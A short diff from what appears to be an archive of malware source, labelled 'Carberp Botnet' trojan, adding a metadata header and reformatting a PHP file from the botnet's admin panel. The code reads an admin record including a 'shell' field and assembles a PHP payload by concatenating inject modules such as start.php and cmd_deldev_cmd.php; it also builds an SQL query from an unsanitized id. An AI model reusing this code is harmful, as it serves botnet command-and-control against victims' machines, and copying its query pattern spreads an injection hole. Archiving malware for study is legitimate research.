@@ -1,9 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 
-if(!empty($Cur['id'])){	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
-	if($result->id == $Cur['id']){		$get_php = '$cur_file = \''.$result->shell.'\';';
+if(!empty($Cur['id'])){
+	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
+	if($result->id == $Cur['id']){
+		$get_php = '$cur_file = \''.$result->shell.'\';';
 		$get_php .= file_get_contents('modules/admins/injects/start.php');
 		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
 		$get_php .= file_get_contents('modules/admins/injects/cmd_deldev_cmd.php');
